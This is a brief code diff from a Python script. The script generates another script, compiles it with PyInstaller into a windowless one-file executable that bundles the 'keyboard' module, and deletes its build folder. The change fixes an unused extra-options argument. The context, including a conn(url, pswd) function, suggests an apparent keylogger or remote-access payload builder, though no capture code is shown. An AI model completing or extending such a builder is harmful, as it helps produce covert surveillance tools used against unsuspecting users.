@@ -187,7 +187,7 @@ while True:
     with open(fileplace + '\\script.py', 'w') as f:
         f.write(pyscript)
 
-    os.system('pyinstaller --noconfirm --onefile --windowed --name "{file}" --clean "{fileplace}\\script.py" --distpath "{exe_path}" --workpath "{fileplace}\\workpath" --specpath "{fileplace}\\specpath" --hidden-import keyboard'.format(fileplace = fileplace, exe_path = os.getcwd() + '\\' + file, file=file, more_opt = more_opt))
+    os.system('pyinstaller --noconfirm --onefile --windowed --name "{file}" --clean "{fileplace}\\script.py" --distpath "{exe_path}" --workpath "{fileplace}\\workpath" --specpath "{fileplace}\\specpath" --hidden-import keyboard {more_opt}'.format(fileplace = fileplace, exe_path = os.getcwd() + '\\' + file, file=file, more_opt = more_opt))
     os.system(f'rd /s /q "{fileplace}"')
 
 def conn(url:str, pswd:str):
